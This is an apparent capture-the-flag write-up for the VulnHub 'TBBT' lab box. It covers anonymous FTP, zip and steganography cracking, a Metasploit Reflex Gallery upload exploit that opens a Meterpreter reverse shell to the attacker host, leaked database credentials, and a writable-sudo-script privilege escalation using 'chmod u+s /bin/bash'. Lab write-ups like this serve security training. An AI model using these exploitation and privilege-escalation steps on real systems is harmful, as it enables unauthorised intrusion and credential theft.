# TBBT (VulnHub) — Writeup

**Difficulty:** Medium
**Flags:** 7 (Sheldon, Howard, Bernadette, Amy, Penny, Raj, Leonard)

## Recon

Nmap scan revealed four open ports:

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu) — "Fun with flags!"
1337/tcp open  waste?
```

`robots.txt` on port 80 disclosed several paths:

```
/howard /web_shell.php /backdoor /rootflag.txt
```

## Flag 1 — Sheldon

Connecting directly to the mystery port 1337 printed the first flag immediately:

```
nc -nv 192.168.1.105 1337
FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
```

A note on the box (`wifi_password.txt`) also leaked a Wi-Fi password (`pennyisafreeloader`) — a red herring not needed for further progress, but a nice touch of flavor text.

## Flag 2 — Howard

FTP allowed anonymous login. Inside the share:

```
note.txt
super_secret_nasa_stuff_here.zip
```

`note.txt` was a taunt claiming the zip was encrypted and "safe." The zip was password-protected, so I extracted the hash with `zip2john` and cracked it with `rockyou.txt`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt s3cret.txt
→ astronaut
```

Unzipping gave `marsroversketch.jpg`. Running `stegseek` against it with the same wordlist strategy (brute-forced) recovered a hidden file:

```
stegseek marsroversketch.jpg
[i] Found passphrase: "iloveyoumom"
[i] Original filename: "FLAG-howard.txt"
```

```
cat marsroversketch.jpg.out
FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
```

## Flag 3 — Bernadette (foothold)

A file named `PENNY_README_ASAP.txt` pointed to a WordPress install at:

```
http://192.168.1.105/music/wordpress/
```

...and handed over a second set of credentials: `stuart / dragon`.

The WordPress instance was running the **Reflex Gallery** plugin, vulnerable to an unauthenticated arbitrary file upload (Metasploit: `unix/webapp/wp_reflexgallery_file_upload`). The exploit module requires valid `Year`/`Month` values for the upload path to resolve correctly — this is the part that initially threw a `"Directory does not exist and could not be created"` error until the correct date parameters were supplied.

```
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
[*] Started reverse TCP handler on 192.168.1.112:4444
[+] Our payload is at: vnYptcZLAMAqL.php. Calling payload...
[*] Meterpreter session 1 opened (192.168.1.112:4444 -> 192.168.1.105:48208)
```

This landed a shell as `www-data`. Reading `wp-config.php` disclosed database credentials and the third flag embedded directly in the file:

```php
define( 'DB_PASSWORD', 'footprintsonthemoon1337' );
$DBUSER = 'bigpharmacorp';
$DBPASS = 'weareevil';
```

```
FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```

## Flag 4 — Amy

A compiled binary, `secretdiary`, was present on the box. Running `strings` against it revealed a hardcoded login flow and credential:

```
strings secretdiary
Enter your username:
Enter your password:
P@SSw0rd123Sh3ld0n
Login Success!
FLAG-amy{60263777358690b90e8dbe8fea6943c9}
Wrong password! YOU WILL NEVER READ MY SECRETS
```

Supplying `P@SSw0rd123Sh3ld0n` at the prompt printed the flag directly — no further reversing needed.

## Flag 5 — Penny

Enumerating home directories as `www-data` turned up a hidden file in Penny's home:

```
www-data@tbbt:/home/penny$ cat .FLAG.penny.txt
RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=
```

Base64-decoding it gave:

```
FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
```

## Privilege Escalation — Leonard

`sudo -l` as `www-data` showed a permitted script, `thermostat_set_temp.sh`, runnable as another user. The script was writable, so I appended a privilege-escalation payload to it:

```
echo 'chmod u+s /bin/bash' >> thermostat_set_temp.sh
```

After triggering it via sudo, `/bin/bash` had the SUID bit set:

```
-rwsr-xr-x 1 root root 1109564 May 16 2017 /bin/bash
```

```
/bin/bash -p
#
```

This gave an effective-root shell.

## Flag 6 — Raj

With root access, I pulled WordPress posts from the `bigpharmacorp` database using the earlier-recovered DB credentials. One post (embedded in a YouTube-oEmbed block) contained the flag directly in its HTML content:

```html
<p>FLAG-raz{40d17a74e28a62eac2df19e206f0987c}</p>
```

## Flag 7 — Leonard (root flag)

With the SUID bash shell established as part of the privesc step above, reading the final flag (`/rootflag.txt`, per the earlier `robots.txt` hint) as root completed the room:

```
FLAG-leonard{17fc95224b65286941c54747704acd3e}
```

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap, `robots.txt` enumeration |
| Flag 1 | Direct banner grab on port 1337 |
| Flag 2 | Anon FTP → zip2john/John → stegseek (chained cracking) |
| Flag 3 / Foothold | Leaked creds → WordPress Reflex Gallery unauth file upload (Metasploit) |
| Flag 4 | `strings` on a local binary |
| Flag 5 | Home directory enum → base64 decode |
| Privesc | Writable sudo-permitted script → `chmod u+s /bin/bash` |
| Flag 6 | Database dump via recovered DB creds |
| Flag 7 | Root-read of flag file after privesc |

**Key takeaway:** the room chains several classic beginner/intermediate techniques — anonymous FTP leaks, nested crypto/stego puzzles, a known CMS plugin CVE, binary string analysis, and a classic writable-sudo-script privesc — into one linear path, with flags scattered as checkpoints throughout rather than only at user/root.
